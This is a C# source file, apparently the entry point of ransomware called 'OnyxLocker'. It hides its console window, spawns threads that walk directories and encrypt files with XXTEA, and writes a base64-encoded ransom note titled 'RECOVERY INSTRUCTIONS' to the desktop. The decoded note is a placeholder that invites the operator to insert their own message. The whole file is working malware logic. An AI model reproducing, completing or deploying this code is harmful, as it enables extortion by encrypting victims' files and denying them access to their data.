using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using OnyxLocker.Classes;

namespace OnyxLocker;

internal class Program
{
	public class DummyParser : IFileParser
	{
		public void ParseFile(string filePath)
		{
			Thread.Sleep(1);
			Console.WriteLine("Parsing files");
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		Thread.Sleep(1);
		ShowWindow(GetConsoleWindow(), 0);
		IEncryptionProvider encryptionProvider = new XxteaEncryptionProvider();
		IFileParser fileParser = new FileParser(encryptionProvider);
		IFileChecker fileChecker = new FileChecker();
		List<Thread> encryptionThreads = GetEncryptionThreads(((IDriveExplorer)new FolderBrowser()).GetStartingFolders(), new DirWalker(fileChecker, fileParser));
		encryptionThreads.ForEach(delegate(Thread encThread)
		{
			encThread.Start();
		});
		encryptionProvider.GetEncryptionKey();
		byte[] bytes = Convert.FromBase64String("WW91IHNob3VsZCByZXBsYWNlIHRoaXMgbWVzc2FnZSB3aXRoIHRoZSBvbmUgeW91IHdhbnQgeW91ciB1c2VycyB0byBzZWUu");
		new MessageWriter(Encoding.UTF8.GetString(bytes), "RECOVERY INSTRUCTIONS", 10).WriteMessageToDesktop();
		encryptionThreads.ForEach(delegate(Thread encThread)
		{
			encThread?.Join();
		});
	}

	private static List<Thread> GetEncryptionThreads(List<string> startFolders, DirWalker directoryWalker)
	{
		List<Thread> list = new List<Thread>();
		foreach (string folder in startFolders)
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				directoryWalker.TraverseDirectories(folder);
			}));
		}
		return list;
	}
}
